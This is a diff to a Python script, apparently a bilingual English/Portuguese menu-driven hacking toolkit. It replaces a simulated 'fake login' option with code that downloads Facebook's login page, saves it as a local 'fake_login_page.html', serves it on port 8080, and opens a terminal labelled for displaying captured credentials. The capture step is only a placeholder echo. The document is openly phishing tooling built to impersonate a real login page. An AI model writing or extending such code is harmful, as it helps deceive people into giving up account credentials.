@@ -1,8 +1,11 @@
 import os
 import subprocess
-from colorama import init, Fore, Style
+import requests
 import time
+import threading
 import numlookupapi
+from colorama import init, Fore, Style
+from http.server import SimpleHTTPRequestHandler, HTTPServer
 
 # Função para limpar a tela do console
 def clear_console():
@@ -229,46 +232,58 @@ def phishing_menu(language):
 def fake_login_pages(language):
     clear_console()
     if language == '1':
-        print("Choose a website to clone for fake login:")
-        print("1. Facebook")
-        print("2. Google")
-        print("3. LinkedIn")
-        print("0. Back to Phishing Menu")
+        print("Cloning Facebook for fake login...")
     else:
-        print("Escolha um site para clonar para login falso:")
-        print("1. Facebook")
-        print("2. Google")
-        print("3. LinkedIn")
-        print("0. Voltar para o Menu de Phishing")
+        print("Clonando Facebook para login falso...")
 
-    choice = input("Choose an option: ")
+    # Download do HTML e CSS da página alvo (exemplo com Facebook)
+    try:
+        url = 'https://facebook.com/login.php'
+        response = requests.get(url)
+        if response.status_code == 200:
+            html_content = response.text
 
-    if choice == '0':
+            # Salvar HTML em um arquivo local
+            with open('fake_login_page.html', 'w', encoding='utf-8') as f:
+                f.write(html_content)
+
+            # Enviar resposta com sucesso
+            print("Página clonada com sucesso!")
+        else:
+            print(f"Erro ao baixar página: {response.status_code}")
+            return
+    except Exception as e:
+        print(f"Erro ao clonar página: {e}")
         return
-    elif choice in ['1', '2', '3']:
-        clone_website(choice, language)
-    else:
-        handle_invalid_option(language)
 
-# Função para clonar um site para login falso
-def clone_website(choice, language):
-    clear_console()
-    website = ""
-    if choice == '1':
-        website = "Facebook"
-    elif choice == '2':
-        website = "Google"
-    elif choice == '3':
-        website = "LinkedIn"
+    # Iniciar o servidor HTTP em uma nova thread
+    thread = threading.Thread(target=start_http_server)
+    thread.daemon = True
+    thread.start()
 
-    if language == '1':
-        print(f"Cloning {website} for fake login...")
-    else:
-        print(f"Clonando {website} para login falso...")
+    # Abrir outro CMD para exibir as credenciais digitadas
+    open_new_terminal()
 
-    # Lógica para clonar o site (simulado)
-    time.sleep(3)
-    input("Press Enter to continue...")
+    input("\nPress Enter to continue...")
+
+# Função para iniciar o servidor HTTP local
+def start_http_server():
+    try:
+        # Servidor HTTP simples para servir a página clonada localmente
+        server_address = ('', 8080)
+        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
+        print('HTTP server is running on port 8080...')
+        httpd.serve_forever()
+    except Exception as e:
+        print(f"Error starting HTTP server: {e}")
+
+# Função para abrir um novo terminal e exibir as credenciais digitadas
+def open_new_terminal():
+    try:
+        # Abrir um novo terminal para exibir as credenciais digitadas
+        subprocess.Popen(['cmd', '/k', 'echo Credentials entered here...'])
+    except Exception as e:
+        print(f"Error opening new terminal: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
